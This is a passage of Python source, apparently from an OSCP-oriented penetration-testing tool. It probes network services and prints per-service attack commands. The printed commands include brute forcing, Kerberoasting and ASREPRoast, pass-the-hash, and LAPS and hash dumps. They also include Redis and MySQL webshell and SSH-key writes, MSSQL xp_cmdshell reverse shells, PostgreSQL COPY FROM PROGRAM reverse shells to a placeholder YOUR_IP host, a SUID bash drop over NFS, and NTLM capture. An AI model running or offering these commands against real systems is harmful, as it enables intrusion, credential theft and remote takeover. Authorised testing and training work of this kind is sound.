                    for exp in exports[:10]:
                        print(f"    {C.WHITE}{exp}{C.END}")
                    # Next step uses the FIRST export path
                    first = exports[0].split()[0] if exports else ''
                    if first:
                        print(f"  {C.GREEN}Next:{C.END} {C.GREY}mkdir -p /tmp/nfs && sudo mount -t nfs {host}:{first} /tmp/nfs -o nolock{C.END}")
                else:
                    print(f"  {C.YELLOW}  ✗ No NFS exports accessible (or showmount timed out){C.END}")
            except Exception:
                pass
        print(f"  {C.GREY}>> rpcinfo -p {host}  # list RPC programs (if rpcinfo works){C.END}")
        print(f"  {C.GREY}>> showmount -e {host}  # list NFS exports{C.END}")
        print(f"  {C.GREY}>> mkdir -p /tmp/nfs && sudo mount -t nfs {host}:/SHARE /tmp/nfs -o nolock{C.END}")
        print(f"  {C.YELLOW}  ⚡ Mount requires sudo on Kali. If exports exist, check .ssh, backups, configs, SUIDs{C.END}")

    elif svc == "NFS" or pr.port == 2049:
        if RUNTIME_OPTS.get("do_active_probes", True):
            try:
                print(f"  {C.GREY}> rpcinfo -p {host}  # active probe{C.END}")
                if PROBE_CACHE["rpcinfo"] is None:
                    PROBE_CACHE["rpcinfo"] = probe_rpcinfo(host)
                rrows = PROBE_CACHE["rpcinfo"] or []
                rsum = summarize_rpcinfo(rrows)
                if rsum:
                    print(f"  {C.CYAN}Active check:{C.END} {C.GREEN}✓ rpcinfo returned RPC programs{C.END}")
                    # Specifically show mountd/nfs-related entries first
                    shown = 0
                    for sline in rsum:
                        if any(k in sline.lower() for k in ("mountd", "nfs", "nlockmgr", "status", "portmapper")):
                            print(f"    {C.WHITE}{sline}{C.END}")
                            shown += 1
                        if shown >= 8:
                            break
                # Show the exact command that produced the exports result.
                print(f"  {C.GREY}> showmount -e {host}  # active probe{C.END}")
                if PROBE_CACHE["nfs_exports"] is None:
                    PROBE_CACHE["nfs_exports"] = probe_nfs_exports(host)
                exports = PROBE_CACHE["nfs_exports"] or []
                if exports:
                    print(f"  {C.CYAN}Active check:{C.END} {C.GREEN}✓ NFS exports found{C.END}")
                    for exp in exports[:10]:
                        print(f"    {C.WHITE}{exp}{C.END}")
                    first = exports[0].split()[0] if exports else ''
                    if first:
                        print(f"  {C.GREEN}Next:{C.END} {C.GREY}mkdir -p /tmp/nfs && sudo mount -t nfs {host}:{first} /tmp/nfs -o nolock{C.END}")
                else:
                    print(f"  {C.CYAN}Active check:{C.END} {C.GREY}no NFS exports (or showmount timed out){C.END}")
            except Exception:
                pass
        print(f"  {C.GREY}>> showmount -e {host}  # list exports{C.END}")
        print(f"  {C.GREY}>> mkdir -p /tmp/nfs && sudo mount -t nfs {host}:/SHARE /tmp/nfs -o nolock{C.END}")
        print(f"  {C.GREY}>> sudo mount -t nfs -o vers=2 {host}:/SHARE /tmp/nfs  # try NFSv2 if v3 fails{C.END}")
        print(f"  {C.YELLOW}  ⚡ Permission denied? Create matching UID user to access files:{C.END}")
        print(f"  {C.GREY}  sudo groupadd --gid 1337 pwn && sudo useradd --uid 1337 -g pwn pwn && sudo su pwn{C.END}")
        print(f"  {C.GREY}  # Replace 1337 with the actual UID shown by: ls -la /tmp/nfs{C.END}")
        print(f"  {C.GREY}>> nmap -Pn -p 111,2049 --script nfs-ls,nfs-showmount,nfs-statfs {host}{C.END}")
        print(f"  {C.YELLOW}  ⚡ If writable: drop .ssh/authorized_keys or SUID binary for privesc{C.END}")
        print(f"  {C.GREY}>> cp /bin/bash /tmp/nfs/bash_suid && chmod u+s /tmp/nfs/bash_suid  # if writable{C.END}")

    elif svc == "DNS" or pr.port == 53:
        print(f"  {C.GREY}>> dig axfr @{host} {_dom}  # zone transfer — reveals ALL hostnames{C.END}")
        print(f"  {C.GREY}>> dig axfr {_dom} @{host}  # alternate syntax{C.END}")
        print(f"  {C.GREY}>> dig any @{host} {_dom}  # ANY record query{C.END}")
        print(f"  {C.GREY}>> dig @{host} -x {host}  # reverse lookup{C.END}")
        print(f"  {C.GREY}>> host -t txt {_dom} {host}  # TXT records (SPF, DMARC, keys){C.END}")
        print(f"  {C.GREY}>> nslookup -type=any {_dom} {host}  # query all record types{C.END}")
        print(f"  {C.GREY}# --- Zone transfer tools ---{C.END}")
        print(f"  {C.GREY}>> dnsrecon -d {_dom} -n {host} -t axfr{C.END}")
        print(f"  {C.GREY}>> dnsrecon -d {_dom} -D {WL.get('dns_subdomains','/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt')} -t brt{C.END}")
        print(f"  {C.GREY}>> dnsenum --enum -f /usr/share/dnsenum/dns.txt --dnsserver {host} {_dom}  # full enum + brute{C.END}")
        print(f"  {C.GREY}>> gobuster dns -d {_dom} -r {host}:53 -t 30 -w {WL.get('dns_subdomains','/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt')}{C.END}")
        print(f"  {C.GREY}>> nmap -Pn -p 53 --script dns-zone-transfer --script-args dns-zone-transfer.domain={_dom} {host}{C.END}")
        print(f"  {C.GREY}>> nmap --script dns-brute,dns-nsid,dns-recursion,dns-zone-transfer -p 53 {host}{C.END}")
        print(f"  {C.YELLOW}  ⚡ Zone transfer reveals ALL hostnames → add each to /etc/hosts → re-scan with new vhosts!{C.END}")
        print(f"  {C.GREY}  echo '{host} <new-hostname>' | sudo tee -a /etc/hosts{C.END}")

    elif svc in ("LDAP", "LDAPS") or pr.port in (389, 636, 3268, 3269):
        ldap_scheme = "ldaps" if pr.port in (636, 3269) else "ldap"
        if pr.port in (3268, 3269):
            print(f"  {C.YELLOW}  ⚡ Global Catalog port – queries ALL domains in the forest{C.END}")
        print(f"  {C.GREY}>> ldapsearch -x -H {ldap_scheme}://{host}:{pr.port} -s base namingcontexts  # get base DN{C.END}")
        print(f"  {C.GREY}>> ldapsearch -x -H {ldap_scheme}://{host}:{pr.port} -b '{_dc}' '(objectClass=*)'  # anon dump{C.END}")
        print(f"  {C.GREY}>> ldapsearch -x -H {ldap_scheme}://{host}:{pr.port} -b '{_dc}' '(objectClass=user)' sAMAccountName description  # user+descriptions{C.END}")
        print(f"  {C.GREY}>> nmap -n -sV --script 'ldap* and not brute' {host}  # ldap nmap enum{C.END}")
        print(f"  {C.GREY}>> ldapdomaindump -u '' -p '' {host}  # anonymous dump to HTML{C.END}")
        print(f"  {C.GREY}>> nxc ldap {host} -u '' -p '' -M get-desc-users  # passwords in descriptions{C.END}")
        print(f"  {C.GREY}# --- HIGH-VALUE password search filters ---{C.END}")
        print(f"  {C.RED}>> ldapsearch -x -H {ldap_scheme}://{host}:{pr.port} -b '{_dc}' '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd sAMAccountName  # LAPS cleartext!{C.END}")
        print(f"  {C.RED}>> ldapsearch -x -H {ldap_scheme}://{host}:{pr.port} -b '{_dc}' '(description=*password*)' sAMAccountName description  # creds in desc!{C.END}")
        print(f"  {C.GREY}>> ldapsearch -x -H {ldap_scheme}://{host}:{pr.port} -b '{_dc}' '(description=*pass*)' sAMAccountName description{C.END}")
        print(f"  {C.GREY}>> ldapsearch -x -H {ldap_scheme}://{host}:{pr.port} -b '{_dc}' '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' sAMAccountName  # no pre-auth{C.END}")
        print(f"  {C.GREY}>> ldapsearch -x -H {ldap_scheme}://{host}:{pr.port} -b '{_dc}' '(servicePrincipalName=*)' sAMAccountName servicePrincipalName  # Kerberoast targets{C.END}")
        print(f"  {C.GREY}>> ldapsearch -x -H {ldap_scheme}://{host}:{pr.port} -b '{_dc}' '(msDS-AllowedToDelegateTo=*)' sAMAccountName  # constrained delegation{C.END}")
        print(f"  {C.GREY}>> ldapsearch -x -H {ldap_scheme}://{host}:{pr.port} -b '{_dc}' '(userAccountControl:1.2.840.113556.1.4.803:=2)' sAMAccountName  # disabled accounts{C.END}")
        print(f"  {C.GREY}# --- With creds ---{C.END}")
        print(f"  {C.GREY}>> ldapdomaindump -u '{_netbios}\\USER' -p PASS ldap://{host} -o ldap_dump{C.END}")
        print(f"  {C.GREY}>> jq -r '.[].attributes.sAMAccountName[]' ldap_dump/domain_users.json | sort -u > users.txt{C.END}")
        print(f"  {C.GREY}>> nxc ldap {host} -u USER -p PASS --password-not-required  # accounts with empty pass{C.END}")
        print(f"  {C.GREY}>> nxc ldap {host} -u USER -p PASS --admin-count  # high-value targets{C.END}")
        print(f"  {C.GREY}>> nxc ldap {host} -u USER -p PASS -M maq  # machine account quota{C.END}")
        print(f"  {C.GREY}>> nxc ldap {host} -u USER -p PASS -M adcs  # certificate services{C.END}")
        print(f"  {C.GREY}>> nxc ldap {host} -u USER -p PASS -M laps  # LAPS passwords{C.END}")
        print(f"  {C.GREY}>> nxc ldap {host} -u USER -p PASS -M gmsa  # gMSA passwords{C.END}")
        print(f"  {C.GREY}>> certipy-ad find -u USER@{_dom} -p PASS -dc-ip {host} -vulnerable  # ADCS ESC1-8{C.END}")
        print(f"  {C.YELLOW}  ⚡ Check user descriptions for passwords (common OSCP win){C.END}")
        print(f"  {C.YELLOW}  ⚡ LAPS (ms-MCS-AdmPwd) = local admin cleartext — check if readable!{C.END}")
        print(f"  {C.YELLOW}  ⚡ LDAP + port 88 = AD → run nxc_spray.sh + bloodhound{C.END}")

    elif svc == "Kerberos" or pr.port == 88:
        print(f"  {C.YELLOW}  ⚡ Kerberos = Active Directory Domain Controller{C.END}")
        print(f"  {C.GREY}>> /home/alien/Desktop/OSCP/Tools/kerbrute_linux_amd64 userenum --dc {host} -d {_dom} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 100{C.END}")
        print(f"  {C.GREY}>> impacket-GetNPUsers {_dom}/ -usersfile users.txt -dc-ip {host} -no-pass -format hashcat  # ASREPRoast{C.END}")
        print(f"  {C.GREY}>> impacket-GetUserSPNs -dc-ip {host} -request {_dom}/USER:PASS  # Kerberoast{C.END}")
        print(f"  {C.GREY}>> hashcat -m 18200 asrep.txt {WL.get('rockyou','/usr/share/wordlists/rockyou.txt')}  # crack AS-REP{C.END}")
        print(f"  {C.GREY}>> hashcat -m 13100 kerb.txt {WL.get('rockyou','/usr/share/wordlists/rockyou.txt')}  # crack Kerberoast{C.END}")
        print(f"  {C.GREY}>> impacket-findDelegation -dc-ip {host} {_dom}/USER:PASS  # delegation attacks{C.END}")
        print(f"  {C.YELLOW}  ⚡ ASREPRoast: no creds needed if users have 'Do not require Kerberos preauthentication'{C.END}")
        print(f"  {C.YELLOW}  ⚡ After first creds → Kerberoast → secretsdump → DCSync{C.END}")

    elif svc in ("WinRM", "WinRM-SSL") or pr.port in (5985, 5986):
        print(f"  {C.GREY}>> evil-winrm -i {host} -u USER -p PASS{C.END}")
        print(f"  {C.GREY}>> evil-winrm -i {host} -u Administrator -H NTHASH  # pass the hash{C.END}")
        print(f"  {C.GREY}>> evil-winrm -i {host} -u USER -p PASS -s /usr/share/evil-winrm/ps1_scripts -e /usr/share/evil-winrm/exe-tools  # load tools{C.END}")
        print(f"  {C.GREY}>> nxc winrm {host} -u USER -p PASS -x 'whoami /all'{C.END}")
        print(f"  {C.GREY}>> nxc winrm {host} -u users.txt -p passwords.txt --continue-on-success  # spray{C.END}")
        print(f"  {C.GREY}# --- Impacket fallback if evil-winrm fails ---{C.END}")
        print(f"  {C.GREY}>> impacket-wmiexec {_dom}/USER:PASS@{host}{C.END}")
        print(f"  {C.GREY}>> impacket-psexec {_dom}/USER:PASS@{host}{C.END}")
        print(f"  {C.YELLOW}  ⚡ Also try: /usr/bin/impacket-psexec 'administrator':'PASS'@{host}{C.END}")

    elif svc == "RDP" or pr.port == 3389:
        print(f"  {C.GREY}# --- Password-based ---{C.END}")
        print(f"  {C.GREY}>> xfreerdp3 /v:{host}:{pr.port} /u:USER /p:PASS /dynamic-resolution /clipboard{C.END}")
        print(f"  {C.GREY}>> xfreerdp3 /v:{host}:{pr.port} /u:USER /p:PASS /d:{_dom} /dynamic-resolution /clipboard  # domain login{C.END}")
        print(f"  {C.GREY}>> xfreerdp3 /v:{host}:{pr.port} /u:USER /p:PASS /bpp:8 /compression /themes /wallpaper /auto-reconnect /size:1920x1080{C.END}")
        print(f"  {C.GREY}>> rdesktop {host}  # fallback client{C.END}")
        print(f"  {C.GREY}>> rdesktop -u USER -p PASS -g 1920x1080 {host}{C.END}")
        print(f"  {C.GREY}# --- Pass-the-Hash (requires DisableRestrictedAdmin=0) ---{C.END}")
        print(f"  {C.GREY}>> xfreerdp3 /v:{host}:{pr.port} /u:Administrator /pth:NTHASH /dynamic-resolution{C.END}")
        print(f"  {C.GREY}>> nxc rdp {host} -u USER -p PASS{C.END}")
        print(f"  {C.GREY}>> nxc rdp {host} -u USER -H NTHASH  # pass the hash{C.END}")
        print(f"  {C.GREY}# --- Brute force ---{C.END}")
        print(f"  {C.GREY}>> hydra -l admin -P {WL.get('rockyou','/usr/share/wordlists/rockyou.txt')} rdp://{host}:{pr.port}{C.END}")
        print(f"  {C.GREY}>> crowbar -b rdp -s {host}/32 -U users.txt -C {WL.get('rockyou','/usr/share/wordlists/rockyou.txt')}  # crowbar = RDP-aware{C.END}")
        print(f"  {C.GREY}# --- Nmap scripts ---{C.END}")
        print(f"  {C.GREY}>> nmap --script rdp-enum-encryption,rdp-vuln-ms12-020,rdp-ntlm-info -p {pr.port} {host}{C.END}")
        print(f"  {C.YELLOW}  ⚡ BlueKeep (CVE-2019-0708): nmap -Pn -p 3389 --script rdp-vuln-ms12-020 {host}{C.END}")
        print(f"  {C.YELLOW}  ⚡ With local admin creds: add /cert-ignore to bypass TLS cert errors{C.END}")

    elif svc == "VNC" or pr.port in (5900, 5901, 5902):
        print(f"  {C.GREY}>> vncviewer {host}:{pr.port}{C.END}")
        print(f"  {C.GREY}>> vncviewer -passwd /path/to/passwordfile {host}:{pr.port}  # if you found a .vnc file{C.END}")
        print(f"  {C.GREY}# --- Default credentials to try ---{C.END}")
        print(f"  {C.GREY}  No password (just press Enter){C.END}")
        print(f"  {C.GREY}  password: vnc / 1234 / admin / password / root{C.END}")
        print(f"  {C.GREY}# --- Nmap scripts ---{C.END}")
        print(f"  {C.GREY}>> nmap -p {pr.port} --script vnc-info,vnc-auth-bypass {host}  # auth bypass check{C.END}")
        print(f"  {C.GREY}# --- Brute force ---{C.END}")
        print(f"  {C.GREY}>> hydra -P {WL.get('rockyou','/usr/share/wordlists/rockyou.txt')} vnc://{host}:{pr.port} -t 1  # -t 1: VNC disconnects on rate{C.END}")
        print(f"  {C.YELLOW}  ⚡ After connecting: scrot → keylogger (xspy) → file browser → look for .ssh keys{C.END}")
        print(f"  {C.GREY}  xwd -root -display {host}:0 -out screenshot.xwd && convert screenshot.xwd screenshot.png  # screenshot from Kali{C.END}")

    elif svc == "Redis" or pr.port == 6379:
        if RUNTIME_OPTS.get("do_active_probes", True):
            print(f"  {C.GREY}>> redis-cli -h {host} -p {pr.port} INFO server  # no-auth probe{C.END}")
            _rd = probe_redis_info(host, pr.port)
            if _rd and "redis_version" in _rd.lower():
                print(f"  {C.RED}⚡ Redis NO-AUTH (direct access):{C.END}")
                for _rl in _rd.splitlines()[:8]:
                    if ":" in _rl:
                        print(f"    {C.WHITE}{_rl.strip()}{C.END}")
            else:
                print(f"  {C.YELLOW}  ✗ Redis: no-auth access DENIED (AUTH required){C.END}")
        _redis_info = probe_redis_info(host, pr.port) if RUNTIME_OPTS.get("do_active_probes", True) else ""
        if _redis_info:
            print(f"  {C.RED}⚡ Redis UNAUTHENTICATED INFO response:{C.END}")
            for _rl in _redis_info.splitlines():
                print(f"    {C.WHITE}{_rl}{C.END}")
        else:
            print(f"  {C.YELLOW}  ⚡ Redis - often unauthenticated! Check for RCE via SSH key or webshell{C.END}")
        print(f"  {C.GREY}>> redis-cli -h {host} -p {pr.port} INFO  # check no-auth{C.END}")
        print(f"  {C.GREY}>> redis-cli -h {host} -p {pr.port} CONFIG GET *{C.END}")
        print(f"  {C.GREY}>> redis-cli -h {host} -p {pr.port} KEYS *{C.END}")
        print(f"  {C.GREY}>> redis-cli -h {host} -p {pr.port} CONFIG GET dir  # find home dir{C.END}")
        print(f"  {C.GREY}# --- SSH key write RCE ---{C.END}")
        print(f"  {C.GREY}>> (echo -e '\\n'; cat ~/.ssh/id_rsa.pub; echo -e '\\n') > /tmp/foo.txt{C.END}")
        print(f"  {C.GREY}>> redis-cli -h {host} flushall{C.END}")
        print(f"  {C.GREY}>> cat /tmp/foo.txt | redis-cli -h {host} -x set crackit{C.END}")
        print(f"  {C.GREY}>> redis-cli -h {host} config set dir /home/redis/.ssh/{C.END}")
        print(f"  {C.GREY}>> redis-cli -h {host} config set dbfilename 'authorized_keys'{C.END}")
        print(f"  {C.GREY}>> redis-cli -h {host} save{C.END}")
        print(f"  {C.GREY}>> ssh -i ~/.ssh/id_rsa redis@{host}{C.END}")
        print(f"  {C.GREY}# --- Webshell write (if web root known) ---{C.END}")
        print(f"  {C.GREY}>> redis-cli -h {host} config set dir /var/www/html/{C.END}")
        print(f"  {C.GREY}>> redis-cli -h {host} config set dbfilename 'shell.php'{C.END}")
        print(f"  {C.GREY}>> redis-cli -h {host} set payload '<?php system($_GET[\"cmd\"]); ?>'{C.END}")
        print(f"  {C.GREY}>> redis-cli -h {host} save{C.END}")

    elif svc == "MySQL" or pr.port == 3306:
        if RUNTIME_OPTS.get("do_active_probes", True):
            print(f"  {C.GREY}>> mysql -h {host} -P {pr.port} -u root -e 'SELECT version();' # anon probe{C.END}")
            _my = probe_mysql_anon(host, pr.port)
            if _my:
                print(f"  {C.RED}⚡ MySQL UNAUTHENTICATED ACCESS:{C.END}")
                for _ml in _my.splitlines()[:10]:
                    print(f"    {C.WHITE}{_ml.strip()}{C.END}")
            else:
                print(f"  {C.YELLOW}  ✗ MySQL: anonymous/root access DENIED{C.END}")
        if RUNTIME_OPTS.get("do_active_probes", True):
            _mysql_probe = probe_mysql_anon(host, pr.port)
            if _mysql_probe:
                col = C.RED if "ANONYMOUS" in _mysql_probe else C.CYAN
                print(f"  {col}MySQL probe: {_mysql_probe}{C.END}")
        print(f"  {C.GREY}>> mysql -h {host} -P {pr.port} -u root  # try empty pass{C.END}")
        print(f"  {C.GREY}>> mysql -h {host} -P {pr.port} -u root -proot{C.END}")
        print(f"  {C.GREY}>> hydra -l root -P {WL.get('rockyou','/usr/share/wordlists/rockyou.txt')} mysql://{host}:{pr.port}{C.END}")
        print(f"  {C.GREY}# --- Post-auth (once logged in) ---{C.END}")
        print(f"  {C.GREY}>> SELECT version(); SELECT user(); SELECT database();{C.END}")
        print(f"  {C.GREY}>> SHOW DATABASES; USE <db>; SHOW TABLES; SELECT * FROM users;{C.END}")
        print(f"  {C.GREY}>> SELECT host, user, authentication_string FROM mysql.user;  # dump hashes{C.END}")
        print(f"  {C.GREY}>> SELECT LOAD_FILE('/etc/passwd');  # file read (needs FILE privilege){C.END}")
        print(f"  {C.GREY}>> SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';  # webshell{C.END}")
        print(f"  {C.GREY}# --- Check if DB user has admin privs (WerTrigger privesc on Windows) ---{C.END}")
        print(f"  {C.GREY}>> SELECT LOAD_FILE('C:\\\\xampp\\\\htdocs\\\\ncat.exe') INTO DUMPFILE 'C:\\\\xampp\\\\htdocs\\\\nc.exe';{C.END}")
        print(f"  {C.GREY}>> # Then: icacls 'C:\\\\xampp\\\\htdocs\\\\nc.exe' — if SYSTEM:(I)(F), DB runs as admin!{C.END}")
        print(f"  {C.YELLOW}  ⚡ MySQL UDF privesc: https://www.exploit-db.com/exploits/1518{C.END}")
        print(f"  {C.YELLOW}  ⚡ CVE-2012-2122: auth bypass on some MySQL/MariaDB (try logging in ~300 times){C.END}")

    elif svc == "MSSQL" or pr.port == 1433:
        if RUNTIME_OPTS.get("do_active_probes", True):
            print(f"  {C.GREY}>> impacket-mssqlclient sa:@{host}:{pr.port}  # sa empty-pw probe{C.END}")
            _ms = probe_mssql_anon(host, pr.port)
            if _ms:
                print(f"  {C.RED}⚡ MSSQL UNAUTHENTICATED ACCESS (sa:empty):{C.END}")
                for _ml in _ms.splitlines()[:5]:
                    print(f"    {C.WHITE}{_ml.strip()}{C.END}")
            else:
                print(f"  {C.YELLOW}  ✗ MSSQL: sa with empty password DENIED{C.END}")
        if RUNTIME_OPTS.get("do_active_probes", True):
            _mssql_probe = probe_mssql_anon(host, pr.port)
            if _mssql_probe:
                print(f"  {C.CYAN}MSSQL probe: {_mssql_probe}{C.END}")
        print(f"  {C.YELLOW}  ⚡ MSSQL - try sa with blank password first!{C.END}")
        print(f"  {C.GREY}>> impacket-mssqlclient sa:@{host} -port {pr.port}  # blank pass{C.END}")
        print(f"  {C.GREY}>> impacket-mssqlclient sa:''@{host} -port {pr.port} -windows-auth{C.END}")
        print(f"  {C.GREY}>> nxc mssql {host} -u sa -p '' --local-auth{C.END}")
        print(f"  {C.GREY}>> sqsh -S {host}:{pr.port} -U sa -P ''  # alternative client{C.END}")
        print(f"  {C.GREY}>> hydra -l sa -P {WL.get('rockyou','/usr/share/wordlists/rockyou.txt')} mssql://{host}:{pr.port}{C.END}")
        print(f"  {C.GREY}# --- Post-auth RCE ---{C.END}")
        print(f"  {C.GREY}>> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;{C.END}")
        print(f"  {C.GREY}>> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;{C.END}")
        print(f"  {C.GREY}>> EXEC xp_cmdshell 'whoami';{C.END}")
        print(f"  {C.GREY}>> EXEC xp_cmdshell 'powershell -e <base64_revshell>';  # reverse shell{C.END}")
        print(f"  {C.GREY}# --- NTLM hash stealing ---{C.END}")
        print(f"  {C.GREY}>> sudo responder -I tun0  # start responder first{C.END}")
        print(f"  {C.GREY}>> EXEC xp_dirtree '\\\\YOUR_IP\\share';  # triggers NTLM auth to you{C.END}")
        print(f"  {C.YELLOW}  ⚡ Check linked servers: EXEC sp_linkedservers; (pivot to other DBs){C.END}")

    elif svc == "PostgreSQL" or pr.port == 5432:
        if RUNTIME_OPTS.get("do_active_probes", True):
            print(f"  {C.GREY}>> psql -h {host} -p {pr.port} -U postgres -c '\\l'  # trust-auth probe{C.END}")
            _pg = probe_postgresql_anon(host, pr.port)
            if _pg:
                print(f"  {C.RED}⚡ PostgreSQL TRUST AUTH (no password):{C.END}")
                for _pl in _pg.splitlines()[:5]:
                    print(f"    {C.WHITE}{_pl.strip()}{C.END}")
            else:
                print(f"  {C.YELLOW}  ✗ PostgreSQL: trust auth DENIED{C.END}")
        if RUNTIME_OPTS.get("do_active_probes", True):
            _pg_probe = probe_postgresql_anon(host, pr.port)
            if _pg_probe:
                col = C.RED if "TRUST" in _pg_probe or "unauthenticated" in _pg_probe else C.CYAN
                print(f"  {col}PostgreSQL probe: {_pg_probe}{C.END}")
        print(f"  {C.GREY}>> psql -h {host} -p {pr.port} -U postgres  # try empty pass{C.END}")
        print(f"  {C.GREY}>> psql -h {host} -p {pr.port} -U postgres -c 'SELECT version();'{C.END}")
        print(f"  {C.GREY}>> hydra -l postgres -P {WL.get('rockyou','/usr/share/wordlists/rockyou.txt')} postgres://{host}:{pr.port}{C.END}")
        print(f"  {C.GREY}# --- Post-auth enum ---{C.END}")
        print(f"  {C.GREY}>> \\du  # list users + roles{C.END}")
        print(f"  {C.GREY}>> \\list  # list databases{C.END}")
        print(f"  {C.GREY}>> \\c <db>  # switch to database{C.END}")
        print(f"  {C.GREY}>> \\dt  # list tables{C.END}")
        print(f"  {C.GREY}>> SELECT usename, passwd FROM pg_shadow;  # dump hashes{C.END}")
        print(f"  {C.GREY}>> SELECT * FROM information_schema.tables;  # all tables{C.END}")
        print(f"  {C.GREY}>> SELECT pg_read_file('/etc/passwd');  # file read if superuser{C.END}")
        print(f"  {C.GREY}# --- RCE via COPY FROM PROGRAM (requires superuser) ---{C.END}")
        print(f"  {C.RED}>> DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text);{C.END}")
        print(f"  {C.RED}>> COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec;{C.END}")
        print(f"  {C.RED}>> COPY cmd_exec FROM PROGRAM 'bash -c \"bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\"';{C.END}")
        print(f"  {C.GREY}# Reverse shell one-liner:{C.END}")
        print(f"  {C.GREY}>> COPY (SELECT '') TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\"';{C.END}")
        print(f"  {C.GREY}# CVE check:{C.END}")
        print(f"  {C.GREY}>> searchsploit postgresql  # version-specific exploits (9.3 RCE, etc.){C.END}")

    elif svc == "Oracle" or pr.port == 1521:
        print(f"  {C.GREY}>> odat all -s {host} -p {pr.port}{C.END}")
        print(f"  {C.GREY}>> tnscmd10g version -h {host} -p {pr.port}{C.END}")
        print(f"  {C.GREY}>> odat sidguesser -s {host} -p {pr.port}  # brute SIDs{C.END}")
        print(f"  {C.GREY}>> odat passwordguesser -s {host} -p {pr.port} -d XE  # default creds{C.END}")

    elif svc == "MongoDB" or pr.port == 27017:
        if RUNTIME_OPTS.get("do_active_probes", True):
            print(f"  {C.GREY}>> mongosh {host}:{pr.port} --eval 'db.adminCommand({{listDatabases:1}})'  # no-auth probe{C.END}")
            _mg = probe_mongodb_unauth(host, pr.port)
            if _mg:
                print(f"  {C.RED}⚡ MongoDB NO-AUTH (databases exposed):{C.END}")
                for _ml in _mg.splitlines()[:8]:
                    print(f"    {C.WHITE}{_ml.strip()}{C.END}")
            else:
                print(f"  {C.YELLOW}  ✗ MongoDB: unauthenticated access DENIED{C.END}")
        if RUNTIME_OPTS.get("do_active_probes", True):
            _mongo_probe = probe_mongodb_unauth(host, pr.port)
            if _mongo_probe:
                col = C.RED if "UNAUTHENTICATED" in _mongo_probe else C.CYAN
                print(f"  {col}MongoDB probe: {_mongo_probe}{C.END}")
        print(f"  {C.GREY}>> mongosh {host}:{pr.port}  # check no-auth{C.END}")
        print(f"  {C.GREY}>> mongosh {host}:{pr.port} --eval 'db.adminCommand({{listDatabases:1}})'{C.END}")
        print(f"  {C.GREY}>> mongosh {host}:{pr.port} --eval 'db.getCollectionNames()'{C.END}")
        print(f"  {C.YELLOW}  ⚡ MongoDB often has no auth! Dump all collections for creds{C.END}")

    elif svc == "Memcached" or pr.port == 11211:
        print(f"  {C.GREY}>> echo 'stats' | nc {host} {pr.port}  # check no-auth{C.END}")
        print(f"  {C.GREY}>> echo 'stats items' | nc {host} {pr.port}  # list cached data{C.END}")
        print(f"  {C.GREY}>> echo 'stats slabs' | nc {host} {pr.port}{C.END}")
        print(f"  {C.GREY}>> echo 'stats cachedump 1 100' | nc {host} {pr.port}  # dump keys{C.END}")
        print(f"  {C.YELLOW}  ⚡ Memcached often stores session tokens & credentials in plaintext{C.END}")

    elif svc == "SNMP" or pr.port == 161:
        if RUNTIME_OPTS.get("do_active_probes", True):
            print(f"  {C.GREY}>> snmpwalk -v2c -c public {host}  # community string probe{C.END}")
            _sn = probe_snmp_community(host)
            if _sn:
                print(f"  {C.RED}⚡ SNMP community strings found: {', '.join(_sn)}{C.END}")
            else:
                print(f"  {C.YELLOW}  ✗ SNMP: common community strings DENIED{C.END}")
        print(f"  {C.YELLOW}  ⚡ SNMP = goldmine: users, processes, installed software, network config, CREDS IN PROCESS ARGS{C.END}")
        if RUNTIME_OPTS.get("do_active_probes", True):
            _snmp_valid = probe_snmp_community(host)
            if _snmp_valid:
                print(f"  {C.RED}⚡ SNMP valid community strings:{C.END} {C.GREEN}{', '.join(_snmp_valid)}{C.END}")
                for _sc in _snmp_valid:
                    print(f"    {C.GREY}snmpwalk -c {_sc} -v2c {host} .{C.END}")
            else:
                print(f"  {C.GREY}  (no common community strings — try extended list){C.END}")
        print(f"  {C.GREY}# --- Community string brute force ---{C.END}")
        print(f"  {C.GREY}>> onesixtyone -c {WL.get('snmp_communities','/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt')} {host}{C.END}")
        print(f"  {C.GREY}>> sudo nmap -Pn -sU -p 161 --script snmp-brute,snmp-info {host}{C.END}")
        print(f"  {C.GREY}# --- Formatted output (easier to read than snmpwalk) ---{C.END}")
        print(f"  {C.GREY}>> snmp-check {host} -c public  # formatted output: users/processes/software{C.END}")
        print(f"  {C.GREY}# --- RCE check via NET-SNMP-EXTEND-MIB (passwords, usernames, binaries!) ---{C.END}")
        print(f"  {C.RED}>> snmpwalk -c public -v1 {host} NET-SNMP-EXTEND-MIB::nsExtendObjects  # ⚡ MAY GIVE RCE{C.END}")
        print(f"  {C.GREY}# --- Specific MIB OIDs (from OSCP guide) ---{C.END}")
        print(f"  {C.GREY}>> snmpwalk -c public -v1 {host} 1.3.6.1.2.1.25.1.6.0   # system processes{C.END}")
        print(f"  {C.GREY}>> snmpwalk -c public -v1 {host} 1.3.6.1.4.1.77.1.2.25  # Windows users{C.END}")
        print(f"  {C.GREY}>> snmpwalk -c public -v1 {host} 1.3.6.1.2.1.25.4.2.1.2 # running processes{C.END}")
        print(f"  {C.GREY}>> snmpwalk -c public -v1 {host} 1.3.6.1.2.1.25.4.2.1.4 # process paths{C.END}")
        print(f"  {C.RED}>> snmpwalk -c public -v1 {host} 1.3.6.1.2.1.25.4.2.1.5 # process args ← CREDS IN ARGS!{C.END}")
        print(f"  {C.GREY}>> snmpwalk -c public -v1 {host} 1.3.6.1.2.1.25.2.3.1.4 # storage units{C.END}")
        print(f"  {C.GREY}>> snmpwalk -c public -v1 {host} 1.3.6.1.2.1.25.6.3.1.2 # installed software{C.END}")
        print(f"  {C.GREY}>> snmpwalk -c public -v1 {host} 1.3.6.1.2.1.6.13.1.3   # open TCP ports{C.END}")
        print(f"  {C.GREY}>> snmpbulkwalk -c public -v2c {host} .  # fast full dump{C.END}")

